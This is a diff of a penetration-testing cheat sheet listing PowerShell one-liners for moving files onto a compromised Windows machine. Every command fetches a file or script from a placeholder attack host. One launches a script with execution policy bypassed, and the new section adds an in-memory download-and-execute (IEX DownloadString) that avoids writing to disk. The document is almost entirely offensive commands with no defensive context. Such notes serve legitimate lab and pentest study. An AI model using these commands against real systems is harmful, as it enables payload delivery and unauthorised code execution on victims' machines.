@@ -1,14 +1,17 @@
-# interactive: download hosted file from attack machine
+#### interactive: download hosted file from attack machine
 powershell -c "(new-object System.Net.WebClient).DownloadFile('http:/ /[hostIP]/[file]','C:\[path to save file to]\[file to save as]')"
 
-# non-interactive method: echo commands pasted into file
+### non-interactive method: echo commands pasted into file
 echo $webclient = New-Object System.Net.WebClient >>wget.ps1 
-echo $url = "http://[attack IP]/evil.exe" >>wget.ps1 
-echo $file = "new-exploit.exe" >>wget.ps1 
+echo $url = "http://[attack IP]/[file to get].exe" >>wget.ps1 
+echo $file = "[save as].exe" >>wget.ps1 
 echo $webclient.DownloadFile($url,$file) >>wget.ps1
 
 # execute powershell file:
 powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
 
 # alternative one-liner
-powershell.exe (New-Object System.Net.WebClient).DownloadFile('http:/ /[attack IP]/evil.exe', 'new-exploit.exe')
+powershell.exe (New-Object System.Net.WebClient).DownloadFile('http:/ /[attack IP]/[file to get].exe', '[save as].exe')
+
+### download and execute powershell script without saving to disk:
+powershell.exe IEX (New-Object System.Net.WebClient).DownloadString(' http://[attack IP]/[filename].ps1')
